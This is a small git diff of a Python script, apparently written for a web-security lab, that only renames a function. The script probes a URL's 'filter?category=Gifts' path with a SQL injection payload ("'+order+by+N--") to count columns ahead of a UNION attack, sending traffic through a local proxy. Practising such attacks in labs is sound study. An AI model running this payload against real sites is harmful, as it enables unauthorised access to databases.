@@ -10,7 +10,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def get_exploit_column_number(url):
+def get_column_number(url):
     path = "filter?category=Gifts"
     for number in range(1,50):
         payload = "'+order+by+%s--" %number
@@ -26,7 +26,7 @@ if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
         print("[+] Figuring out number of columns...")
-        column_number = get_exploit_column_number(url)
+        column_number = get_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
